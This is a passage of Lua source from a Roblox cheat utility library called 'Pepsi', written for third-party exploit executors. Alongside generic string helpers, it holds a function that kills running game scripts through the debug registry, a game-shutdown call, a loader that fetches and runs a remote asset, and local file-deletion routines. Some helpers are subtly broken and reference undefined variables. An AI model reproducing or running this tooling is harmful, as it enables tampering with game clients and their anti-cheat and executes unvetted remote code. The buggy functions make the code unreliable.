		Pepsi.Arg(newindex, {"boolean", "nil"}, 3, f)
		Pepsi.Arg(signals, {"table", "nil"}, 4, f)
		Pepsi.Arg(custom_meta, {"table", "nil"}, 5, f)
	end
	local default = {
		ClassName = tostring(classname)
	}
	local rules = {
		ClassName = {
			value = tostring(classname),
			readonly = true,
			types = {
				["string"] = true
			}
		}
	}
	local classsignals = {}
	local triggerfuncs = {}
	if "table" == type(properties) then
		for key, data in pairs(properties) do
			if type(data) ~= "table" or (type(data.readonly) ~= "nil" and type(data.readonly) ~= "boolean") or (type(data.types) ~= "nil" and type(data.types) ~= "table" and type(data.types) ~= "string") then
				Pepsi.Arg(data, "table", 2, f, "Value must be a table")
				Pepsi.Arg(data.readonly, {"nil", "boolean"}, 2, f, "readonly must be a boolean")
				Pepsi.Arg(data.types, {"table", "string", "nil"}, 2, f, "type(s) must be a string")
			end
			if not data.types and data.readonly then
				data.types = {typeof(data.value)}
			end
			if type(data.types) ~= "table" then
				data.types = {data.types}
			end
			if type(data.types) == "table" then
				data.types = table.dictionary(data.types)
			end
			if data.readonly and dbg and dbg.sro and type(data.value) == "table" then
				pcall(dbg.sro, data.value, true)
			end
			if data.trigger then
			end
			default[key] = data.value
			rules[key] = data
		end
	end
	if "table" == type(signals) then
		for key, data in pairs(signals) do
			if type(data) ~= "table" or (type(data.triggers) ~= "table" and typeof(data.triggers) ~= "RBXScriptSignal" and typeof(data.triggers) ~= "Instance") or (type(data.readonly) ~= "nil" and type(data.readonly) ~= "boolean") then
				Pepsi.Arg(data, "table", 4, f, "Value must be a table")
				Pepsi.Arg(data.readonly, {"nil", "boolean"}, 4, f, "readonly must be a boolean")
				Pepsi.Arg(data.triggers, {"table", "RBXScriptSignal", "Instance"}, 4, f, "trigger(s) must be a Signal or BindableEvent")
			end
			if typeof(data.triggers) == "Instance" and not data.trigger:IsA("BindableEvent") then
				Pepsi.Arg(nil, {"RBXScriptSignal", "Instance"}, 4, f, "trigger(s) must be a Signal or BindableEvent")
			end
			if nil == data.readonly then
				data.readonly = true
			end
			local signal = newproxy(true)
			local name = tostring("Signal " .. key)
			local functionality = getmetatable(signal)
			function functionality.__tostring(self)
				return name
			end
			functionality.__metatable = "The metatable is locked"
			functionality.__arguments = {}
			functionality.__signals = {}
			functionality.__bindable = Instance.make("BindableEvent", {
				Name = name
			})
			functionality.__index = {
				ClassName = "RBXScriptSignal"
			}
			function functionality.__index:Wait()
				functionality.__bindable.Event:Wait()
				return unpack(functionality.__arguments, 0X1, functionality.__arguments[0X0])
			end
			function functionality.__index:Connect(func)
				return functionality.__bindable.Event:Connect(function()
					func(unpack(functionality.__arguments, 0X1, functionality.__arguments[0X0]))
				end)
			end
			if not data.readonly then
				function functionality.__index:Fire(...)
					functionality.__arguments = {[0X0] = select("#", ...), ...}
					functionality.__bindable:Fire()
					functionality.__arguments = nil
				end
				function functionality.__index:Destroy()
					if #functionality.__signals > 0 then
						for _, connection in pairs(functionality.__signals) do
							connection:Disconnect()
							connection = nil
						end
						functionality.__signals = {}
					end
					functionality.__bindable:Destroy()
					functionality.__bindable = nil
					functionality.__arguments = nil
					signal = nil
				end
			end
			function functionality.__newindex(self, property, value)
				return error(property .. " cannot be assigned to", 3)
			end
			if type(data.triggers) ~= "table" then
				data.triggers = {data.triggers}
			end
			for _, sig in pairs(data.triggers) do
				if typeof(sig) ~= "Instance" and typeof(sig) ~= "RBXScriptSignal" then
					Pepsi.Arg(sig, {"RBXScriptSignal", "Instance"}, 4, f, "trigger(s) must be a Signal or BindableEvent")
				end
				if typeof(data.triggers) == "Instance" and not data.trigger:IsA("BindableEvent") then
					Pepsi.Arg(nil, {"RBXScriptSignal", "Instance"}, 4, f, "trigger(s) must be a Signal or BindableEvent")
				end
				local s = typeof(sig) == "RBXScriptSignal" and sig or sig.Event
				table.insert(functionality.__signals, s:Connect(function(...)
					functionality.__arguments = {[0X0] = select("#", ...), ...}
					functionality.__bindable:Fire()
					functionality.__arguments = nil
				end))
			end
			default[key] = signal
			rules[key] = {
				readonly = true
			}
			classsignals[key] = signal
		end
	end
	local userdata = newproxy(true)
	local functionality = getmetatable(userdata)
	functionality.__metatable = "The metatable is locked"
	functionality.__Address = tostring(userdata):gsub("userdata", tostring(classname))
	functionality.__index = default
	function functionality.__tostring(self)
		return functionality.__Address
	end
	function functionality.__newindex(self, property, value)
		if rawget(rules, property) then
			if rules[property].readonly then
				return error("can't set value", 3)
			elseif not rules[property].types[typeof(value)] then
				if type(value) == "string" then
					return error("Invalid value \"\r" .. tostring(value:sub(1, 80)) .. "\" for " .. classname, 3)
				elseif type(value) == "number" then
					return error("Invalid value \r" .. tostring(value) .. " for " .. classname, 3)
				end
				return error("Invalid value for " .. classname, 3)
			else
				return rawset(default, property, value)
			end
		elseif newindex then
			return rawset(default, property, value)
		else
			return error(property .. " is not a valid member of " .. classname, 3)
		end
	end
	if type(custom_meta) == "table" then
		for typ, data in pairs(custom_meta) do
			local meta, before, after, replace = data.value, data.before, data.after, data.replace
			if type(meta) == "function" then
				if (type(replace) ~= "nil" and type(replace) ~= "boolean") or (type(after) ~= "nil" and type(after) ~= "boolean") or (type(before) ~= "nil" and type(before) ~= "boolean") then
					Pepsi.Arg(before, {"nil", "boolean"}, 5, f, "before must be a boolean")
					Pepsi.Arg(after, {"nil", "boolean"}, 5, f, "after must be a boolean")
					Pepsi.Arg(replace, {"nil", "boolean"}, 5, f, "replace must be a boolean")
				end
				if true == before or after == true or true == replace then
					local orig = functionality[typ]
					if replace then
						orig = meta
					end
					functionality[typ] = function(...)
						if before then
							meta(...)
						end
						if true ~= after then
							return orig(...)
						end
						orig(...)
						if after == true then
							return meta(...)
						end
					end
				end
			else
				functionality[typ] = meta
			end
		end
	end
	return userdata--, classsignals -- Walla
end
function Pepsi.SetEnv(key, value, ret_val) -- Useful for setting values in if statements
	if type(key) ~= "string" or (type(ret_val) ~= "nil" and type(ret_val) ~= "boolean") then
		Pepsi.Arg(key, "string", 1, "Pepsi.SetEnv")
		Pepsi.Arg(ret_val, {"nil", "boolean"}, 3, "Pepsi.SetEnv")
	end
	local s = xpcall(rawset, warn, assert(type(getfenv) == "function" and getfenv, "getfenv missing?")(), key, value)
	if ret_val == true then
		return value, s
	elseif ret_val ~= nil then
		return ret_val, s
	end
	return s
end
function Pepsi.Sd()
	return pcall(Pepsi.ncall, game, "Shutdown")
end
function Pepsi.BodyResistance(subject, source, trigger_dist, force, force_y, subject_mass, trigger_size, id, expire)
	if typeof(subject) ~= "Instance" or (typeof(source) ~= "CFrame" and typeof(source) ~= "Vector3") or (type(trigger_dist) ~= "nil" and type(trigger_dist) ~= "number") or (type(force) ~= "nil" and type(force) ~= "number") or (type(force_y) ~= "nil" and type(force_y) ~= "number") or (type(subject_mass) ~= "nil" and type(subject_mass) ~= "number") or (type(trigger_size) ~= "nil" and type(trigger_size) ~= "number") or (type(id) ~= "nil" and type(id) ~= "string") or (type(expire) ~= "nil" and type(expire) ~= "number") then
		Pepsi.Arg(subject, "Instance", 1, "Pepsi.BodyResistance")
		Pepsi.Arg(source, {"CFrame", "Vector3", "Instance"}, 2, "Pepsi.BodyResistance")
		Pepsi.Arg(trigger_dist, {"number", "nil"}, 3, "Pepsi.BodyResistance")
		Pepsi.Arg(force, {"number", "nil"}, 4, "Pepsi.BodyResistance")
		Pepsi.Arg(force_y, {"number", "nil"}, 5, "Pepsi.BodyResistance")
		Pepsi.Arg(subject_mass, {"number", "nil"}, 6, "Pepsi.BodyResistance")
		Pepsi.Arg(trigger_size, {"number", "nil"}, 7, "Pepsi.BodyResistance")
		Pepsi.Arg(id, {"string", "nil"}, 8, "Pepsi.BodyResistance")
		Pepsi.Arg(expire, {"number", "nil"}, 9, "Pepsi.BodyResistance")
	end
	if typeof(source) == "Instance" then
		Pepsi.Arg(Pepsi.ToVector3(source), {"Vector3"}, 2, "Pepsi.BodyResistance")
	end
	if not subject:IsA("BasePart") then
		local newsubject = Pepsi.GetPart(subject)
		if not newsubject:IsA("BasePart") then
			Pepsi.Arg(subject, {"BasePart"}, 1, "Pepsi.BodyResistance")
		else
			subject = newsubject
		end
	end
	trigger_dist = tonumber(trigger_dist or 10) or 10
	force = tonumber(force or 12000) or 12000
	force_y = tonumber(force_y or 12000) or 12000
	subject_mass = tonumber(subject_mass or 0) or 0
	trigger_size = tonumber(trigger_size or 0) or 0
	id = tostring(id or "BodyResistance") or "BodyResistance"
	trigger_dist = trigger_size + trigger_dist
	local bm = subject:FindFirstChild(id) 
	if bm then
		bm:Destroy()
	end
	bm = Instance.make("BodyVelocity", {
		name = id,
		MaxForce = Vector3.new(),
		Velocity = Vector3.new()
	}, ((type(expire) == "number" and expire) or nil))
	if typeof(source) == "CFrame" then
		source = source.Position
	end
	Pepsi.espawn(function()
		Pepsi.BodyIds = Pepsi.BodyIds or {}
		local cd_ct = time()
		Pepsi.BodyIds[id] = cd_ct
		if expire then
			delay(1 + expire, function()
				if Pepsi.BodyIds[id] == cd_ct then
					Pepsi.BodyIds[id] = nil
					if bm then
						bm:Destroy()
					end
				end
			end)
		end
		while Pepsi.Rs:Wait() and Pepsi.BodyIds[id] == cd_ct and subject and source and trigger_dist and force and force_y and subject_mass and bm and (not expire or time() - cd_ct < expire) and bm.Parent == subject do
			local tsource = (typeof(source) == "Instance" and Pepsi.ToVector3(source)) or source
			local dist = (subject.Position - tsource).Magnitude
			if bm and dist > 0 and dist <= trigger_dist then
				local look = (CFrame.new(subject.Position, tsource).LookVector * -1)
				bm.Velocity = (trigger_dist * look) - look
				local rat = trigger_dist / dist
				local f = subject_mass + (force * rat)
				local y = subject_mass + (force_y * rat)
				bm.MaxForce = Vector3.new(f, y, f)
				bm.Parent = subject
			elseif bm then
				bm.MaxForce = Vector3.new()
				bm.Velocity = Vector3.new()
			else
				return
			end
		end
		if not expire then
			Pepsi.BodyIds[id] = nil
		end
	end)
	bm = (bm and bm:Destroy() and nil) or nil
end
function Pepsi.SetVal(obj, key, value, ret_val) -- Useful for setting values in if statements
	if type(obj) == "nil" or type(key) == "nil" or (type(ret_val) ~= "boolean" and type(ret_val) ~= "nil") then
		Pepsi.Arg(obj, "nil", 1, "Pepsi.SetVal", "Argument #1 can't be nil!", true)
		Pepsi.Arg(key, "nil", 2, "Pepsi.SetVal", "Argument #2 can't be nil!", true)
		Pepsi.Arg(ret_val, {"nil", "boolean"}, 4, "Pepsi.SetVal")
	end
	local s = xpcall(function()
		obj[key] = value
	end, warn)
	if ret_val == true then
		return value, s
	elseif ret_val ~= nil then
		return ret_val, s
	end
	return s
end
function Pepsi.Index(t, i)
	return Pepsi.scall(function()
		return t[v]
	end)
end
function Pepsi.FixMouse(pers)
	local x, y = Pepsi.MousePos()
	if type(isrbxactive) == "function" and type(mousemoverel) == "function" then
		local t = pers and 0 or time()
		while wait() and not isrbxactive() do
			if pers and time() - t > 10 then
				mousemoverel(1, 1)
			end
		end
	end
	if type(mousemoveabs) == "function" and type(mousemoverel) == "function" then
		mousemoveabs(Pepsi.Viewport(0.5, 0.5))
		wait()
		mousemoverel(1, 1)
	end
	wait()
	if type(x) == "number" and type(y) == "number" then
		if type(mousemoveabs) == "function" then
			return mousemoveabs(x, y)
		else
			Pepsi.MoveMouse(x, y)
		end
	end
end
function Pepsi.IsBool(thing)
	return thing == nil or thing == 1 or thing == 0 or type(thing) == "boolean"
end
function Pepsi.Bool(thing, raw)
	if thing == nil or thing == 0 then
		return false
	elseif thing == 1 then
		return true
	elseif type(thing) == "boolean" then
		return thing
	elseif raw == true or raw == 1 then
		return thing
	end
	return not not thing
end
function Pepsi.CastBool(thing)
	if thing == nil or thing == 0 then
		return false
	elseif thing == 1 then
		return true
	elseif type(thing) == "boolean" then
		return thing
	end
	return error("Unable to cast string to bool", 2)
end
function Pepsi.WaitForDeath(loser, to)
	if (type(loser) ~= "nil" and (typeof(loser) ~= "Instance" or loser.ClassName ~= "Player")) or (type(to) ~= "nil" and type(to) ~= "number") then
		Pepsi.Arg(loser, {"nil", "Player"}, 1, "Pepsi.WaitForDeath")
		Pepsi.Arg(to, {"nil", "number"}, 2, "Pepsi.WaitForDeath")
	end
	loser = loser or Pepsi.Lp
	to = to or 300
	if (typeof(loser) ~= "Instance" or loser.ClassName ~= "Player") or type(to) ~= "number" then
		Pepsi.Arg(loser, {"Player"}, 1, "Pepsi.WaitForDeath")
		Pepsi.Arg(to, {"number"}, 2, "Pepsi.WaitForDeath")
	end
	Pepsi.WaitUntilFunc(function()
		local st = time()
		local c = loser and loser.Character
		local h = c and c:FindFirstChildOfClass("Humanoid")
		local function wfhc()
			if loser and loser.Parent then
				loser.CharacterAdded:Wait()
				c, h = nil, nil
				while wait() and loser and loser.Parent and (not c or not h or (c and not c.Parent) or (h and not h.Parent)) and time() - st < to do
					c = loser and loser.Character
					h = c and c:FindFirstChildOfClass("Humanoid")
					if loser and loser.Parent and c and c.Parent and h and h.Parent and h.Health > 0 then
						return h
					else
						c, h = nil, nil
					end
				end
			end
		end
		if loser and c and h and c.Parent and h.Parent then
			if h and h.Parent and h.Health > 0 then
				return h.Died:Wait()
			else
				c = loser and loser.Character
				h = c and c:FindFirstChildOfClass("Humanoid")
				while wait() and time() - st < to do
					wfhc()
					c = loser and loser.Character
					h = c and c:FindFirstChildOfClass("Humanoid")
					if h.Health > 0 then
						return h.Died:Wait()
					end
				end
			end
		end
	end, to, false)
end
function Pepsi.GUID(...)
	return Pepsi.Service("HttpService"):GenerateGUID(...)
end
--function Pepsi.AllSet(master, keys, values, ...)
--	if type(master) ~= "table" and typeof(master) ~= "Instance" and robloxtype(master) ~= "userdata" then
--		Pepsi.Arg(master, {"table", "userdata", "Instance"}, 1, "Pepsi.AllSet", nil, false, false, true)
--	end
--end
if type(is_synapse_function) == "function" and type(debug) == "table" and type(debug.getinfo) == "function" and type(getfenv) == "function" and type(setfenv) == "function" and type(debug.getregistry) == "function" then
	function Pepsi.KillAllScripts(slack)
		if slack == nil then
			slack = Pepsi.Obj("CoreGui", "DevConsoleMaster", "DevConsoleWindow", "Visible")
		end
		local me = debug.getinfo(2).func or setfenv(2, getfenv(2))
		local function kill(f)
			local cfdata = debug.getinfo(f)
		    if cfdata.what == "C" then
		        return
			end
		    local fenv = getfenv(f)
			local source = fenv.script
			local function clonedfunc()
			end
			setfenv(clonedfunc, {unpack(fenv)})
		    function fenv:__index()
		        error(string.sub(tostring(source or "Script"), 1, 30) .. " Killed")
		    end
			if typeof(source) == "Instance" then
				pcall(function()
					source.Disabled = true
				end)
				pcall(function()
					source:Destroy()
				end)
			end
		    return setfenv(f, setmetatable({}, fenv))
		end
		local s = 0
		for k, v in pairs(debug.getregistry()) do
		    if v ~= me and type(v) == "function" and is_synapse_function(v) and type(k) == "string" and string.len(k) == 16 then
				((slack and spawn) or pcall)(function()
			        warn("Killing", k)
			        Pepsi.xpcall(kill, warn, v)
				end)
		    end
		end
		return kill(me)
	end
--	Pepsi.KAS = Pepsi.KillAllScripts
--	Pepsi.kas = Pepsi.KillAllScripts
--	Pepsi.Kas = Pepsi.KillAllScripts
--	Pepsi.KaS = Pepsi.KillAllScripts
end

-- After shocking multiple moths, the fifth one literally exploded in dust and smoke after I put the electric pen on max capcity in attempts to speed up the moth termanation. I guess he was so damn happy to recive a jolt, that he couldnt handle it.

if type(delfile) == "function" and type(delfolder) == "function" and type(isfolder) == "function" and type(makefolder) == "function" and type(isfile) == "function" and type(writefile) == "function" and type(appendfile) == "function" then	
	function Pepsi.Dir(opt, ...)
		local args = {...}
		local offset = false
		local ot
		if type(opt) ~= "table" then
			if type(opt) == "string" then
				table.insert(args, 1, opt)
				offset, opt = true, {}
			else
				Pepsi.Arg(opt, {"table", "string"}, 1, "Pepsi.Dir")
			end
		else
			ot = opt.Target
		end
		opt = table.overwrite({
			Read = false,
			Write = false,
			Append = false,
			Make = false,
			Delete = false,
			Silent = true,
			Target = "File",
			MaxTries = 3
		}, opt)
		if type(opt.MaxTries) ~= "number" or type(opt.Target) ~= "string" or (type(opt.Silent) ~= "boolean" and type(opt.Silent) ~= "nil") or (type(opt.Write) ~= "boolean" and type(opt.Write) ~= "nil" and type(opt.Write) ~= "string") or (type(opt.Append) ~= "boolean" and type(opt.Append) ~= "nil" and type(opt.Append) ~= "string") or (type(opt.Make) ~= "boolean" and type(opt.Make) ~= "nil") or (type(opt.Read) ~= "boolean" and type(opt.Read) ~= "nil") or (type(opt.Delete) ~= "boolean" and type(opt.Delete) ~= "nil") then
			Pepsi.Arg(opt.Read, {"boolean", "nil"}, 1, "Pepsi.Dir", "Read must be a boolean")
			Pepsi.Arg(opt.Delete, {"boolean", "nil"}, 1, "Pepsi.Dir", "Delete must be a boolean")
			Pepsi.Arg(opt.Make, {"boolean", "nil"}, 1, "Pepsi.Dir", "Make must be a boolean")
			Pepsi.Arg(opt.Write, {"boolean", "nil", "string"}, 1, "Pepsi.Dir", "Write must be a string")
			Pepsi.Arg(opt.Append, {"boolean", "nil", "string"}, 1, "Pepsi.Dir", "Append must be a string")
			Pepsi.Arg(opt.Silent, {"boolean", "nil"}, 1, "Pepsi.Dir", "Silent must be a boolean")
			Pepsi.Arg(opt.Target, {"string"}, 1, "Pepsi.Dir", "Target must be 'Folder' or 'File'")
			Pepsi.Arg(opt.MaxTries, {"number"}, 1, "Pepsi.Dir", "MaxTries must be a number")
		end
		if opt.MaxTries > 20 then
			opt.MaxTries = 20
		elseif opt.MaxTries <= 0 then
			opt.MaxTries = 1
		end
		if opt.Write or opt.Read then
			opt.Target = "fi"
		else
			opt.Target = "fo"
		end
		if tonumber(opt.Target) == 1 or string.sub(string.lower(opt.Target), 1, 2) == "fo" then
			opt.Target = "Folder"
		else
			opt.Target = "File"
		end
		for k, v in pairs(args) do
			Pepsi.Arg(v, {"string"}, ((offset and k) or 1 + k), "Pepsi.Dir")
		end
		opt.Target = ot or (string.find(args[#args], ".", nil, true) and "File") or opt.Target or "Folder"
		local path = false
		local last = #args
		for k, v in pairs(args) do
			if not path then
				path = v
			else
				path = path .. "\\" .. v
			end
			local t = (k == last and opt.Target) or "Folder"
			t = (t == "File" and t) or "Folder"
			local func = (t == "Folder" and isfolder) or isfile
			local mfunc = (t == "File" and writefile) or makefolder
			local dfunc = (t == "File" and delfile) or delfolder
			local didreport = false
			local ops = 0
			if opt.Make and (not opt.Delete or k ~= last) then
				while not func(path) and ops < opt.MaxTries do
					if not opt.Silent then
						didreport = true
						warn("Making", string.lower(t), "'" .. v .. "'")
					end
					mfunc(path, opt.Write or "")
					ops = 1 + ops
				end
				if not opt.Silent and not func(path) then
					if ops >= opt.MaxTries then
						warn("Could not make", string.lower(t), "'" .. v .. "'. Exceeded maximum tries.")
					elseif not didreport then
						warn("Missing", string.lower(t), "'" .. v .. "'")
					end
					return false
				end
			end
			if k == last then
				if opt.Delete then
					ops = 0
					didreport = false
					while func(path) and ops < opt.MaxTries do
						if not opt.Silent then
							didreport = true
							warn("Deleting", string.lower(t), "'" .. v .. "'")
						end
						dfunc(path)
						ops = 1 + ops
					end
					if not opt.Silent and func(path) then
						if ops >= opt.MaxTries then
							warn("Could not delete", string.lower(t), "'" .. v .. "'. Exceeded maximum tries.")
						end
						return not func(path)
					end
				end
				if opt.Target == "File" then
					local r = isfile(path)
					if r then
						if opt.Write then
							writefile(path, opt.Write)
						end
						if opt.Append then
							appendfile(path, opt.Append)
						end
						if opt.Read then
							return readfile(path)
						end
					end
					if opt.Delete then
						return not isfile(path)
					end
					return r or isfile(path)
				elseif opt.Target == "Folder" then
					if opt.Delete then
						return not isfolder(path)
					end
					return isfolder(path)
				end
				local res = (isfolder(path) or isfile(path))
				if opt.Delete then
					return not res
				end
				return res
			end
		end
		path = table.concat(args, "\\")
		path = isfolder(path) or isfile(path)
		if opt.Delete then
			return not path
		end
		return path
	end
else
	function Pepsi.Dir(...)
		return warn("Pepsi.Dir is not compatable with your exploit.") == 0
	end
end
Pepsi.EnvSet = Pepsi.SetEnv
Pepsi.ValSet = Pepsi.SetVal
Pepsi.ypcall = Pepsi.ycall
--Pepsi.ByteCode = Pepsi.LoadByteCode
--Pepsi.Bytecode = Pepsi.LoadByteCode
--Pepsi.LoadBytecode = Pepsi.LoadByteCode
--Pepsi.Humanoid = Pepsi.Human
--Pepsi.GetHuman = Pepsi.Human
--Pepsi.GetHumanoid = Pepsi.Human
Pepsi.GetUi = Pepsi.GetUI
--Pepsi.Waypoint = FromWaypoints
--Pepsi.Waypoints = FromWaypoints
Pepsi.Others = Pepsi.GetOthers
Pepsi.arg = Pepsi.Arg
--Pepsi.HoverGui = Pepsi.HoveredGui
--Pepsi.GuiUnderMouse = Pepsi.HoveredGui
--Pepsi.GuiMouse = Pepsi.HoveredGui
--Pepsi.GetGui = Pepsi.HoveredGui
Pepsi.BindMark = Pepsi.ConnectMark
Pepsi.CenterMouse = Pepsi.FixMouse
Pepsi.Message = Pepsi.Splash
Pepsi.Distance = Pepsi.Dist
Pepsi.MoveMouseAbs = Pepsi.MoveMouse
--Pepsi.Enemy = Pepsi.GetEnemy
--Pepsi.Enemies = Pepsi.GetEnemy
--Pepsi.GetEnemies = Pepsi.GetEnemy
Pepsi.Spawn = Pepsi.spawn
Pepsi.Delay = Pepsi.delay
--Pepsi.WaitFor = Pepsi.WaitOnAny
--Pepsi.WaitOn = Pepsi.WaitOnAny
--Pepsi.yfecall = Pepsi.efycall
--Pepsi.fyecall = Pepsi.efycall
--Pepsi.yefcall = Pepsi.efycall
--Pepsi.feycall = Pepsi.efycall
--Pepsi.eyfcall = Pepsi.efycall
--Pepsi.fyscall = Pepsi.fsycall
--Pepsi.sfycall = Pepsi.fsycall
--Pepsi.yfscall = Pepsi.fsycall
--Pepsi.syfcall = Pepsi.fsycall
--Pepsi.ysfcall = Pepsi.fsycall
Pepsi.yscall = Pepsi.sycall
Pepsi.yfcall = Pepsi.fycall
Pepsi.fecall = Pepsi.efcall
Pepsi.sfcall = Pepsi.fscall
Pepsi.HasMark = Pepsi.IsMarked
function string.rawfind(s, f, p, cs)
	if type(p) == "boolean" and cs == nil then
		cs, p = p, nil
	end
	if type(s) ~= "string" or type(f) ~= "string" then
		Pepsi.Arg(s, "string", 1, "string.rawfind")
		Pepsi.Arg(f, "string", 2, "string.rawfind")
	end
	if not Pepsi.Bool(cs) then
		s, f = string.lower(s), string.lower(f)
	end
	if p ~= nil and type(p) ~= "number" then
		p = nil
	end
	return string.find(s, f, p, true)
end
function string.fromtime(num, zero_str)
	if not num or type(num) ~= "number" and not tonumber(num) then
		Pepsi.Arg(num, {"number"}, 1, "string.fromtime")
	end
	num = tonumber(num)
	if num <= 0 then
		return zero_str or ""
	end
	local days = math.floor(num / 86400)
	local hours = math.floor(num / 3600 - days * 24)
	local minutes = math.floor(num / 60 - days * 1440 - hours * 60)
	local seconds = math.floor(num - days * 86400 - hours * 3600 - minutes * 60)
	local timestr = ""
	if days > 0 then
		local tempstr = days .. ":"
		if hours <= 9 then
			tempstr = tempstr .. "0"
		end
		timestr = tempstr .. hours .. ":"
	else
		timestr = hours .. ":"
	end
	if days > 0 or hours > 0 then
		if minutes <= 9 then
			timestr = timestr .. "0"
		end
		timestr = timestr .. minutes .. ":"
	elseif minutes > 0 then
		timestr = minutes .. ":"
	end
	if 0 >= days and 0 >= hours and 0 >= minutes then
		return seconds .. "s"
	end
	if seconds <= 9 then
		timestr = timestr .. "0"
	end
	return timestr .. seconds
end
function string.eachmatch(str, format, func)
	local of = func
	if type(format) == "function" then
		func, format = format, func
	end
	if type(format) == "nil" then
		format = "[^\r\n]+"
	end
	if type(str) ~= "string" or type(format) ~= "string" or type(func) ~= "function" then
		Pepsi.Arg(str, {"string"}, 1, "string.eachmatch")
		Pepsi.Arg(format, {"string"}, 2, "string.eachmatch")
		Pepsi.Arg(func, {"function"}, 3, "string.eachmatch")
	end
	for line in string.gmatch(str, format) do
	    func(line)
	end
end
function string.trim(str)
	if type(str) ~= "string" then
		Pepsi.Arg(str, "string", 1, "string.trim")
	end
	return string.match(str, "^%s*(.-)%s*$")
end
function string.removewhite(str)
	if type(str) ~= "string" then
		Pepsi.Arg(str, "string", 1, "string.removewhite")
	end
	str = string.trim(str)
    local qty = false
    while not qty or qty > 0 and str do
        str, qty = string.gsub(s, "  ", " ")
    end
    return str or ""
end
function string.subfind(str, fnd, stp, include_search, startpos, rawfind)
	if type(str) ~= "string" or type(fnd) ~= "string" or (type(stp) ~= "number" and type(stp) ~= "string" and type(stp) ~= "nil") or (type(include_search) ~= "boolean" and type(include_search) ~= "nil") then
		Pepsi.Arg(str, "string", 1, "string.subfind")
		Pepsi.Arg(fnd, "string", 2, "string.subfind")
		Pepsi.Arg(stp, {"nil", "string", "number"}, 3, "string.subfind")
		Pepsi.Arg(include_search, {"nil", "boolean"}, 4, "string.subfind")
		Pepsi.Arg(startpos, {"nil", "number"}, 5, "string.subfind")
		Pepsi.Arg(rawfind, {"nil", "boolean"}, 6, "string.subfind")
	end
	local a = ((include_search and 0) or string.len(fnd))
	if not a then
		return a
	end
	local b = (string.find(str, fnd, startpos, rawfind))
	if not b then
		return b
	end
	if type(stp) ~= "string" then
		return string.sub(str, a + b, stp)
	end
	str = string.sub(str, a + b)
	return string.sub(str, 1, ((stp and ((string.find(str, stp, nil, rawfind)) - 1 + ((include_search and string.len(stp)) or 0))) or nil))
end
function string.bytecode(str, env, read) -- LuaU may have broke a few things in here....
	return ({Pepsi.LoadAsset(0x150CAFE6F)()(str, env, read)})[2]
end
function string.pack(str, split)
	if type(str) ~= "string" or (type(split) ~= "nil" and type(split) ~= "string" and type(split) ~= "number") then
		Pepsi.Arg(str, "string", 1, "string.pack")
		Pepsi.Arg(split, {"string", "nil", "number"}, 2, "string.pack")
	end
	if type(split) == "number" then
		split = string.rep(".", split)
	elseif not split then
		split = "."
	end
	local t = {}
	str:gsub(str, split, function(c)
		table.insert(t, c)
	end)
	return t
end
function string.filter(s_str)
	return tostring(tostring(s_str or ""):gsub(".", function(c)
		if string.upper(c) == string.lower(c) then
			return "\\" .. (string.byte(c) or c)
		end
	end) or "")
end
function string.simplify(s_str)
	return tostring(tostring(s_str or ""):gsub(".", function(c)
		if string.upper(c) == string.lower(c) and not tonumber(c) then
			return ""
		end
	end) or "")
end
function string.formatesc(str)
	if type(str) ~= "string" then
		Pepsi.Arg(str, "string", 1, "string.formatesc")
	end
	return (string.gsub(str, ".", function(c)
        return rawget({
            ["\r"] = "\\r",
            ["\n"] = "\\n",
            ["\t"] = "\\t",
            ["'"] = "\\'",
            ["\""] = "\\\""
        }, c)
    end))
end
function string.bytes(s_str)
	s_str = tostring(s_str or "")
	return tostring(string.gsub(s_str, ".", function(c)
		return ("\\" .. string.byte(c)) or c or ""
	end))
end
function string.hex(str)
	return (str:gsub(".", function(h)
		return string.format("%02X", string.byte(h))
	end))
end
function string.unhex(str)
	return (str:gsub("..", function(hx)
		return string.char(tonumber(hx, 0X10))
	end))
end
function string.getvalue(str)
	return Pepsi.ecall(loadstring("return (" .. str .. ")"))
end
function string.chars(s_str, skipchar)
	s_str = string.sub(tostring(s_str or ""), 1, 200)
	local len, pos = string.len(s_str), 0
	return tostring(skipchar and "" or "string.char(") .. tostring(s_str:gsub(".", function(c)
		pos = 1 + pos
		return "0x" .. tostring(string.format("%X", c:byte())) .. tostring((function()
			if pos >= len then
				return ""
			end
			return ", "
		end)())
	end)) .. tostring(skipchar and "" or ")")
end
function string.stringify(...) -- replicates a , in print/warn argument
	local s = ""
	local strands = {...}
	while #strands > 0 do
		local cs = tostring(table.remove(strands, 1)) or "nil"
		if s ~= "" then
			s = s .. " "
		end
		s = s .. tostring(cs or "")
	end
	return tostring(s)
end
function string.charify(s_str) -- turn text into number
	s_str = tostring(s_str or "")
	if s_str:len() < 200 then
		return string.chars(s_str)
	else
		local num = 0
		return "(" .. s_str:gsub(string.rep(".", 200), function(str)
			num = 1 + num
			if num == 1 then
				return string.chars(str)
			end
			return " .. " .. string.chars(str)
		end) .. ")"
	end
end
function string.num(...)
	local args = {...}
	if #args == 1 then
		if type(args[1]) == "number" then
			return ...
		end
		if type(tostring(args[1])) == "string" then
			local temp = tostring(args[1]):gsub("%D", "")
			if temp:len() <= 0 then
				return
			end
			return tonumber(temp)
		end
		return ...
	end
	local nargs = {} -- No disrespect, just short for new_args
	for k = 1, #args do
		Pepsi.ecall(function()
			local v = args[k]
			if type(v) == "string" then
				nargs[k] = tonumber((v:gsub("%D", "")))
			end
		end)
	end
	return unpack(nargs)
end
function string._split(text, pattern, plain) -- Sorta like a tokenizer
	local ret = {}
	for match in (function(text, pattern, plain)
		local splitStart, length = 1, #text
		return function()
			if splitStart then
				local sepStart, sepEnd = string.find(text, pattern, splitStart, plain)
				local ret
				if not sepStart then
					ret = string.sub(text, splitStart)
					splitStart = nil
				elseif sepEnd < sepStart then
					ret = string.sub(text, splitStart, sepStart)
					if sepStart < length then
						splitStart = sepStart + 1
					else
						splitStart = nil
					end
				else
					ret = sepStart > splitStart and string.sub(text, splitStart, sepStart - 1) or ""
					splitStart = sepEnd + 1
				end
				return ret
			end
		end
	end)(text, pattern, plain) do
		table.insert(ret, match)
	end
	return ret
end
function string.raw(str) -- \\65 > A
	return (str:gsub("\\(%d+)", string.char))
end
function string.new(len)
	len = tonumber(len or math.random(3, 10)) or math.random(3, 10)
	return string.rep("_", len):gsub(".", function()
		return string[({"lower", "upper"})[math.random(2)]](string.char(math.random(65, 90))) -- Clever
	end)
end
string.nums = string.num
string.number = string.num
string.numbers = string.num
string.eachline = string.eachmatch
function utf8.gsub(str, find, rep)
    local build, count = "", 0
    while string.len(str) > 0 do
        local l, co, e, c = 1, 0, pcall(utf8.codepoint, str, 1, 1)
        l = string.len(utf8.char(c)) or 1
